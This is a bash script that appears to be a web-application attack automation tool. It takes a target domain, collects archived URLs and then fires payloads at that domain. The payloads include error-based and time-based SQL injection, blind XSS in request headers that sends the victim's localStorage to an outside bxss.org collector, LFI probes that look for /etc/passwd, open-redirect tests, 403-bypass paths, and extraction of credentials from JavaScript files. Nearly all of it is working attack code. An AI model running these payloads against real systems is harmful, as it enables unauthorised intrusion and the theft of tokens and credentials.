#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color / Reset


# Check if domain is provided
while getopts ":d:" opt; do
  case ${opt} in
    d )
      input_domain=$OPTARG
      ;;
    \? )
      echo "Usage: $0 -d <domain>"
      exit 1
      ;;
  esac
done

if [ -z "$input_domain" ]; then
  echo "Usage: $0 -d <domain>"
  exit 1
fi

# Remove https:// or http:// from the domain if present
domain=$(echo "$input_domain" | sed 's~http[s]*://~~' | sed 's~/.*~~')

echo
echo -e "${YELLOW}------- [*] Target: $domain ${NC}"
echo



echo
echo -e "${YELLOW}=======================${NC}"
echo -e "${YELLOW}[*] Archive Unique URLs${NC}"
echo -e "${YELLOW}=======================${NC}"
echo

echo -e "${YELLOW}------- [+] Running waymore.py ${NC}"
waymore_output=$(python ./waymore/waymore.py -i "https://${domain}/" -mode U -lcc 10 2>/dev/null)

echo -e "${YELLOW}------- [+] Running urlfinder ${NC}"
urlfinder_output=$(./urlfinder -d "$domain" -silent -all 2>/dev/null)

echo -e "${YELLOW}------- [+] Running gau ${NC}"
gau_output=$(./gau "$domain" 2>/dev/null)

# Merge all outputs together
merged_output=$(printf "%s\n%s\n%s" "$waymore_output" "$urlfinder_output" "$gau_output")

# Remove duplicate lines and empty lines
final_output=$(echo "$merged_output" | sort -u | sed '/^$/d')
echo
echo -e "${YELLOW} $final_output ${NC}"
echo
echo -e "${YELLOW} [+] Total Unique URLs: $(echo "$final_output" | wc -l) ${NC}"


echo
echo -e "${YELLOW}===============================${NC}"
echo -e "${YELLOW}[*] Custom Vulnerabilities Test${NC}"
echo -e "${YELLOW}===============================${NC}"
echo


echo -e "${GREEN}------- [+] Error-Based SQLi${NC}"
echo "$final_output" | grep -Ei "\.php|\.asp|\.aspx" | awk -F'[?#]' '{print $1}' | sort -u | while IFS= read -r base; do
  grep -F "$base" <<< "$final_output" | head -n 1
done | while IFS= read -r url; do
  base_part="${url%%\?*}"
  query_part="${url#*\?}"

  # Skip if no query string
  [[ "$url" == "$base_part" ]] && continue
  IFS='&' read -ra param_pairs <<< "$query_part"

  for payload in \
    "'\"" \
    "';" \
    "\";" \
    "')" \
    "' or '1'='1" \
    "\" or \"1\"=\"1" \
    "' or 1=1#" \
    "' or 'a'='a" \
    "' OR 1=1 LIMIT 1 --" \
    "' AND 1=0 UNION ALL SELECT NULL, NULL, NULL--" \
    "1' /**/ORDER/**/BY/**/ 1-- -" \
    "'%20RLIKE%20(SELECT%20(CASE%20WHEN%20(7427=7427)%20THEN%200x64717764%20ELSE%200x28%20END))--%20" \
    "1%27/**/%256fR/**/50%2521%253D22%253B%2523" \
    "' AND 1=0 UNION SELECT 1,2,'sqlinj'--" \
    "' AND updatexml(1,concat(0x3a,user(),0x3a),1)--" \
    "' AND extractvalue(1,concat(0x3a,database(),0x3a))--" \
    "' AND (SELECT 1 FROM (SELECT(SLEEP(0)))a)--" \
    "' AND 1=(SELECT COUNT(*) FROM tabname);--"
  do
    for i in "${!param_pairs[@]}"; do
      modified_params=("${param_pairs[@]}")
      key="${param_pairs[$i]%%=*}"
      modified_params[$i]="$key=$(printf '%s' "$payload" | jq -sRr @uri)"  # URL-encode payload
      new_query=$(IFS='&'; echo "${modified_params[*]}")
      test_url="${base_part}?${new_query}"
      response=$(curl -sL --compressed "$test_url" | strings)

      if echo "$response" | grep -Eiq "mysql|sql syntax|warning.*mysql|mysql_fetch_array|mysql_num_rows|mysql_query|mysql_result|mysqli_|pg_query|pg_exec|pgsql_query|supplied argument is not a valid PostgreSQL result|PostgreSQL.*ERROR|Query failed: ERROR:|pg_fetch_array|pg_num_rows|SQLITE_ERROR|SQLite/JDBCDriver|System.Data.SQLite.SQLiteException|unclosed quotation mark|quoted string not properly terminated|Microsoft OLE DB Provider for SQL Server|ODBC SQL Server Driver|SQLServerException|Incorrect syntax near|Unexpected end of command|Syntax error in string|You have an error in your SQL syntax|DB2 SQL error|Sybase message|Fatal error: Uncaught exception 'PDOException'|javax\.sql\.SQLException|org\.hibernate\.exception|java\.sql\.SQLException|Syntax error converting the varchar value|Unknown column|Column not found|ORA-\d+|Oracle error|PLS-\d+|PL/SQL|OperationalError|psycopg2\.errors|ProgrammingError|ActiveRecord::StatementInvalid|Zend_Db_Statement_Exception|PDOException|PDO->|ODBC.*Driver|SQLSTATE|sql error|Invalid SQL statement|not a valid MySQL result|invalid input syntax for type|unterminated quoted string|expected end of input"; then
        echo -e "${RED}[!] SQL Error Detected:\033[0m $test_url ${NC}"
      fi
    done
  done
done
echo -e "${GREEN} ===========> [✓] Done${NC}"
echo



echo -e "${GREEN}------- [+] Time-Based SQLi${NC}"
echo "$final_output" | grep -Ei "\.php|\.asp|\.aspx" | awk -F'[?#]' '{print $1}' | sort -u | while IFS= read -r base; do
  grep "$base" <<< "$final_output" | head -n 1
done | while IFS= read -r url; do
  # Split base and query
  base_part="${url%%\?*}"
  query_part="${url#*\?}"

  # If no "?" exists, skip
  if [[ "$url" == "$base_part" ]]; then
    continue
  fi
  IFS='&' read -ra param_pairs <<< "$query_part"

  for payload in \
    "a%27%2dIF%28LENGTH%28database%28%29%29%3e9%2cSLEEP%287%29%2c0%29or%271%27%3d%271" \
    "1'+&&+sleep(7)" \
    "56001'%20%26%26%20sleep(7)" \
    "1'+|+sleep(7)" \
    "1'||selECt+SlEeP(7)#" \
    "1%27%7c%7cselECt%2bSlEeP%287%28%23" \
    "1;SELECT+IF((8303>8302),SLEEP(7),2356)#" \
    "'%2b(select*from(select(sleep(7)))a)%2b'" \
    "test'%20AND%20(SELECT%206377%20FROM%20(SELECT(SLEEP(7)))hLTl)--" \
    "'XOR(if(now()=sysdate(),sleep(6),0))OR'--" \
    "'%20WAITFOR%20DELAY%20'0:0:5'--" \
    "';%20waitfor%20delay%20'0:0:6'%20--%20" \
    "1' || pg_sleep(10)--" \
    "')) or sleep(5)='" \
    "1398995181833')/**/or/**/sleep(3)--+-" \
    "';SELECT PG_SLEEP(5)--" \
    "x'%3BSELECT pg_sleep(5)--"
  do
    for i in "${!param_pairs[@]}"; do
      modified_params=("${param_pairs[@]}")
      key="${param_pairs[$i]%%=*}"
      modified_params[$i]="$key=$(printf '%s' "$payload" | jq -sRr @uri)" # URL encode
      new_query=$(IFS='&'; echo "${modified_params[*]}")
      test_url="${base_part}?${new_query}"

      # Time the response
      t=$( { time curl -sL --compressed "$test_url" -o /dev/null; } 2>&1 | grep real | awk '{print $2}' )
      secs=$(echo "$t" | awk -F'm' '{printf "%.2f", ($1 * 60) + $2}' | sed 's/s//')
      if (( $(echo "$secs > 6.5" | bc -l) )); then
        echo -e "${RED}[!] Time-Based SQLi Detected:\033[0m $test_url (Delay: ${secs}s) ${NC}"
      fi
    done
  done
done
echo -e "${GREEN} ===========> [✓] Done ${NC}"
echo



echo
echo -e "${GREEN}------- [+] Secret Header Fuzzing ${NC}"
echo

if [[ "$domain" =~ ^https?:// ]]; then
    url="$domain"
else
    # If missing, add http:// by default
    url="https://$domain"
fi

# Create temp files for headers and body
headers_file=$(mktemp)
body_file=$(mktemp)

curl -s -D "$headers_file" -o "$body_file" --compressed \
  -H "CACHE_INFO: 127.0.0.1" \
  -H "CF_CONNECTING_IP: 127.0.0.1" \
  -H "CF-Connecting-IP: 127.0.0.1" \
  -H "CLIENT_IP: 127.0.0.1" \
  -H "Client-IP: 127.0.0.1" \
  -H "COMING_FROM: 127.0.0.1" \
  -H "CONNECT_VIA_IP: 127.0.0.1" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Forwarded-Port: 80" \
  -H "X-Forwarded-Proto: http" \
  -H "X-Forwarded-Host: 127.0.0.1" \
  -H "X-Forwarded-Server: 127.0.0.1" \
  -H "X-Forwarded: 127.0.0.1" \
  -H "Forwarded-For: 127.0.0.1" \
  -H "Forwarded: for=127.0.0.1;by=127.0.0.1;host=127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -H "X-Remote-Addr: 127.0.0.1" \
  -H "X-Rewrite-Url: 127.0.0.1" \
  -H "X-original-url: http://127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "X-True-Client-IP: 127.0.0.1" \
  -H "True-Client-IP: 127.0.0.1" \
  -H "True-Client-Ip: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "Client-IP: 127.0.0.1" \
  -H "X-Cluster-Client-IP: 127.0.0.1" \
  -H "WL-Proxy-Client-IP: 127.0.0.1" \
  -H "Proxy-Client-IP: 127.0.0.1" \
  -H "Fastly-Client-IP: 127.0.0.1" \
  -H "Ali-CDN-Real-IP: 127.0.0.1" \
  -H "Cdn-Src-Ip: 127.0.0.1" \
  -H "Cdn-Real-Ip: 127.0.0.1" \
  -H "CF-Connecting-IP: 127.0.0.1" \
  -H "X-Host: 127.0.0.1" \
  -H "X-Custom-IP-Authorization: 127.0.0.1" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
  -H "Referer: https://$domain/diagrams/" \
  -H "Accept-Encoding: identity" \
  -H "Accept-Language: en-US,en;q=0.9" \
  "$url"

# Extract values
content_length=$(grep -i '^Content-Length:' "$headers_file" | awk '{print $2}' | tr -d '\r')
status_code=$(grep -m1 -oE 'HTTP/[0-9.]+ [0-9]{3}' "$headers_file" | awk '{print $2}')
location_header=$(grep -i '^Location:' "$headers_file" | awk '{$1=""; print $0}' | sed 's/^[ \t]*//' | tr -d '\r')
title=$(grep -o '<title[^>]*>.*</title>' "$body_file" | sed -e 's/<\/\?title>//g' | head -n1)

echo -e "${GREEN} ===========> Title: ${title:-N/A} ${NC}"
echo -e "${GREEN} ===========> Status code: $(grep -m1 -oE 'HTTP/[0-9.]+ [0-9]{3}' "$headers_file" | awk '{print $2}') ${NC}"
if [[ -n "$location_header" ]]; then
    echo -e "${GREEN} ===========> Location Header: $location_header ${NC}"
fi
echo -e "${GREEN} ===========> Content-Length: ${content_length:-N/A} ${NC}"

# Clean up
rm -f "$headers_file" "$body_file"




echo
echo
echo -e "${GREEN}---------- [+] HTTP SSRF${NC}"
python HTTP.SSRF.py -t $input_domain




echo
echo
echo -e "${GREEN}------- [+] Sending BXSS Payloads in headers${NC}"
echo

curl -s -o /dev/null \
  -H "CLIENT_IP: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "Client-IP: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "X-Forwarded-For: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "X-Forwarded-Port: 80" \
  -H "X-Forwarded-Proto: http" \
  -H "X-Forwarded-Host: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "X-Forwarded-Server: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "X-Forwarded: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "Forwarded-For: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "X-Remote-IP: <img%20src='https://bxss.org/h/EU2PjPl1Mkqk?jwt='+JSON.stringify(localStorage);'--!>" \
  -H "X-Remote-Addr: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-Rewrite-Url: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-original-url: http://%22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-Originating-IP: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-Real-IP:  %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-Originating-IP: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-True-Client-IP: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "True-Client-IP: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "True-Client-Ip: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-Client-IP: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "Client-IP: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "Proxy-Client-IP: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "X-Host: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "User-Agent: %22><img%20src=x%20onerror=this.src=%22//bxss.org/h/EU2PjPl1Mkqk%22;>" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
  -H "Referer: %22><iframe%20srcdoc='&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;https://bxss.org/h/EU2PjPl1Mkqk&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;'>" \
  -H "Accept-Encoding: identity" \
  -H "Accept-Language: en-US,en;q=0.9" \
  "$url"

echo -e "${GREEN} ===========> [✓] Done${NC}"
echo


echo
echo -e "${GREEN}------- [+] Testing LFI:-${NC}"
echo

cat LFI-small.txt | while read payload; do
  echo "$final_output" | gf lfi | ./qsreplace "$payload" | xargs -I% -P 20 sh -c 'curl -s "%" | grep -q "root:x" && echo "[VULN] %"'
done
echo -e "${GREEN} ===========> [✓] Done${NC}"
echo


echo
echo -e "${GREEN}------- [+] Testing Open Redirect:-${NC}"
echo
export LHOST="https://www.example.com"; echo "$final_output" | gf redirect | ./qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

echo "$final_output" | grep -aEi '([?&][a-z0-9_-]{1,20}=|[^a-z0-9])https?%3A%2F%2F|https?://' | ./qsreplace 'http://www.example.com' | while read host do;do curl -s -L $host -I | grep "http://www.example.com" && echo -e "$host \033[0;31mVulnerable\n" ;done

echo -e "${GREEN} ===========> [✓] Done${NC}"
echo




echo
echo -e "${YELLOW}===========================${NC}"
echo -e "${YELLOW}[*] Js Path Crawl & Secrets${NC}"
echo -e "${YELLOW}===========================${NC}"
echo


##Bypass 403 Forbidden
PAYLOADS=(
    "/"
    "/*"
    "/%2f/"
    "/./"
    "./."
    "/*/"
    "?"
    "??"
    "&"
    "#"
    "%"
    "%20"
    "%09"
    "/..;/"
    "../"
    "..%2f"
    "..;/"
    ".././"
    "..%00/"
    "..%0d"
    "..%5c"
    "..%ff/"
    "%2e%2e%2f"
    ".%2e/"
    "%3f"
    "%26"
    "%23"
    ".json"
)


# Find JS files from the final output
Js_Files=$(echo "$final_output" | grep -iE '\.js(\?|$)' | grep -ivE '\.json(\?|$)' | sort -u)
echo "$final_output" | sed -E 's|https?://[^/]+||' | sort -u > Archive_Paths.txt


# Loop through each JS file & Extract Pathes From JS
for line in $Js_Files; do
  echo "[*] Analyzing: $line" | curl -sk "$line" | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | grep -Po "(\/)((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0-9\{\}]+))" | grep -ivE "jquery|global|embed_local|vendors|bootstrap|tagging|translations|polyfill" | grep -vE "^\/{1,2}$" | sort -u > archive_Js_Analysis.txt
done

if [[ ! -s archive_Js_Analysis.txt ]]; then
  : > archive_Js_Analysis.txt
fi


URL="$input_domain"
TMP_DIR=$(mktemp -d)
JS_URLS="$TMP_DIR/js_urls.txt"
ALL_JS="$TMP_DIR/all_js.txt"
OUTPUT0="$TMP_DIR/extracted_main_paths.txt"
OUTPUT1="$TMP_DIR/extracted_paths.txt"

#Get all .js file URLs from the main target
curl -s -L "$URL" | grep -oP '(["'\''( ])\/?[A-Za-z0-9_\-./]+\.js[^"'\'' )]*' | sed -E 's/^["'\''( ]//g' | \
while read -r js_path; do
  if [[ "$js_path" =~ ^// ]]; then
    echo "https:${js_path}"
  elif [[ "$js_path" =~ ^/ ]]; then
    echo "${URL%/}${js_path}"
  elif [[ "$js_path" =~ ^http ]]; then
    echo "$js_path"
  else
    echo "${URL%/}/$js_path"
  fi
done | sort -u > "$JS_URLS"

if [[ ! -s "$JS_URLS" ]]; then
  echo -e "${RED}------- [X] No Main JS files on Target:-${NC}"
else
  echo -e "${GREEN}------- [✓] Found $(wc -l < "$JS_URLS") JS files in Target.${NC}"

  while read -r main_js_url; do
    echo -e "${YELLOW}[~] Parsing: $main_js_url${NC}"
    js_content=$(curl -s -k "$main_js_url")

    echo "$js_content" | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | grep -ivE "jquery|global|embed_local|vendors|bootstrap|tagging|translations|polyfill|www.w3.org|redocly.com|redoc.ly|json-schema.org|fb.me|Chrome|example.com|apis.google.com|i.test|.test|Content-Security-Policy|Strict-Transport-Security|github.com|git.io|reactjs.org|raw.githubusercontent.com|stackoverflow.com|YYYY|cdn.jsdelivr.net|favicon.ico|momentjs.com|www.apollographql.com|www.googletagmanager.com" 
    echo "$js_content" | grep -Po "(\/)((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0-9\{\}]+))" | grep -ivE "jquery|global|embed_local|vendors|bootstrap|tagging|translations|polyfill|www.w3.org|redocly.com|redoc.ly|json-schema.org|fb.me|Chrome|example.com|apis.google.com|i.test|.test|Content-Security-Policy|Strict-Transport-Security|github.com|git.io|reactjs.org|raw.githubusercontent.com|stackoverflow.com|YYYY|cdn.jsdelivr.net|favicon.ico|momentjs.com|www.apollographql.com|www.googletagmanager.com" 
    echo "$js_content" | grep -oEi '[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'
  done < "$JS_URLS" | sort -u | tee "$OUTPUT0"
fi


##Migrate_all_JS_URLs
echo $Js_Files > Archive_Js.txt
if [[ ! -s Archive_Js.txt ]]; then
  echo -e "${RED}[X] No Js Urls Found in Archive${NC}"
fi

cat $JS_URLS Archive_Js.txt > All_JS_URLs.txt
Js_URLS_Var="All_JS_URLs.txt"


echo
echo -e "${GREEN}------- [+] Running Katana:-${NC}"

./katana -u $URL -jc -jsl

echo -e "${GREEN} ===========> [✓] Done${NC}"
echo



echo
echo -e "${GREEN}------- [+] Running SecretFinder:-${NC}"
echo 
xargs -P4 -I{} python3 SecretFinder.py -i {} -o cli < "$Js_URLS_Var" | grep "possible_Creds" | sed -E 's/^possible_Creds[[:space:]]*->[[:space:]]*//' | grep -Ev '^[A-Za-z0-9+/=]{100,}$' | grep -Ev '^(A|0|E)+$' | grep -Ev 'ACgAMAAwADAAM+' | grep -Ev 'E{5,}A{5,}' 


echo
echo
echo -e "${GREEN}------- [+] Hunt DOM XSS PostMessage:-${NC}"
echo
cat "$Js_URLS_Var" | while IFS= read -r _js_url_; do
  [ -n "$_js_url_" ] || continue
  curl -s "$_js_url_"
done | ./httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
echo -e "${GREEN} ===========> [✓] Done${NC}"
echo



echo
echo
echo -e "${GREEN}------- [+] Crawling Paths:-${NC}"
echo

read -p "------- [+] Run Crawling ?? (y/n): " choice
echo
if [[ "$choice" != "y" && "$choice" != "Y" ]]; then
    echo "------- [+] Skipping Crawling..."
    echo
    rm -f archive_Js_Analysis.txt Archive_Paths.txt Archive_Js.txt
    rm -f "$Js_URLS_Var" "$OUTPUT0" "$OUTPUT1"
    exit 0
fi


##Extract paths from each JS file
while read -r js_url; do
  js_url=$(echo "$js_url" | xargs)  # trim whitespace
  [[ -z "$js_url" ]] && continue    # skip empty lines
  curl -s "$js_url" |
  grep -aoP '(?<=(\"|'\''|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|'\''|\`))' |
  grep -ivE "jquery|global|embed_local|vendors|bootstrap|tagging|translations|polyfill" |
  grep -vE "^\/{1,2}$"
done < "$Js_URLS_Var" | tee "$OUTPUT1" | sort -u > "$OUTPUT1.sorted" && mv "$OUTPUT1.sorted" "$OUTPUT1"


cat "$OUTPUT1" archive_Js_Analysis.txt Archive_Paths.txt > All_paths.txt
sort All_paths.txt | uniq > uniq-paths.txt

rm -f archive_Js_Analysis.txt Archive_Paths.txt All_paths.txt
rm -f "$Js_URLS_Var" "$OUTPUT0" "$OUTPUT1"


##Crawling
PATH_FILE="uniq-paths.txt"
while read -r path; do
    
  #Remove leading/trailing whitespace
  #Skip empty lines
  #Ensure path starts with /
  clean_path=$(echo "$path" | xargs)
  [ -z "$clean_path" ] && continue
  [[ "$clean_path" != /* ]] && clean_path="/$clean_path"

  FULL_URL="${URL}${clean_path}"

  RESPONSE=$(curl -s -i "$FULL_URL" | tr -d '\000')
  STATUS=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
  LENGTH=$(echo "$RESPONSE" | grep -i '^Content-Length:' | awk '{print $2}' | tr -d '\r')
  BODY=$(echo "$RESPONSE" | awk 'BEGIN{body=0} /^\r?$/{body=1; next} body')
  TITLE=$(echo "$BODY" | grep -i -o '<title[^>]*>.*</title>' | sed -E 's/<\/?title[^>]*>//g' | head -n 1 | xargs) 
  echo ${FULL_URL} 
  echo "          [GET] ====> [${STATUS}] - [${TITLE:-N/A}] - [Size: ${LENGTH:-unknown}]"
  if [[ "$STATUS" == "403" ]]; then
      for payload in "${PAYLOADS[@]}"; do
          MODIFIED_URL="${URL}${path}${payload}"
          MOD_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$MODIFIED_URL")
          echo "          $MODIFIED_URL : $MOD_STATUS"
      done
  fi

  RESPONSE2=$(curl -s -i -X POST -H "Content-Type: application/json" -d '{"key":"value"}' "$FULL_URL" | tr -d '\000')
  STATUS2=$(echo "$RESPONSE2" | head -n 1 | awk '{print $2}')
  LENGTH2=$(echo "$RESPONSE2" | grep -i '^Content-Length:' | awk '{print $2}' | tr -d '\r')
  BODY2=$(echo "$RESPONSE2" | awk 'BEGIN{body=0} /^\r?$/{body=1; next} body')
  TITLE2=$(echo "$BODY2" | grep -i -o '<title[^>]*>.*</title>' | sed -E 's/<\/?title[^>]*>//g' | head -n 1 | xargs)
  echo "         [POST] ====> [${STATUS2}] - [${TITLE2:-N/A}] - [Size: ${LENGTH2:-unknown}]"

  RESPONSE3=$(curl -s -i -X PUT -H "Content-Type: application/json" -d '{"key":"value"}' "$FULL_URL" | tr -d '\000')
  STATUS3=$(echo "$RESPONSE3" | head -n 1 | awk '{print $2}')
  LENGTH3=$(echo "$RESPONSE3" | grep -i '^Content-Length:' | awk '{print $2}' | tr -d '\r')
  BODY3=$(echo "$RESPONSE3" | awk 'BEGIN{body=0} /^\r?$/{body=1; next} body')
  TITLE3=$(echo "$BODY3" | grep -i -o '<title[^>]*>.*</title>' | sed -E 's/<\/?title[^>]*>//g' | head -n 1 | xargs)
  echo "          [PUT] ====> [${STATUS3}] - [${TITLE3:-N/A}] - [Size: ${LENGTH3:-unknown}]"
  echo

done < "$PATH_FILE"

rm uniq-paths.txt
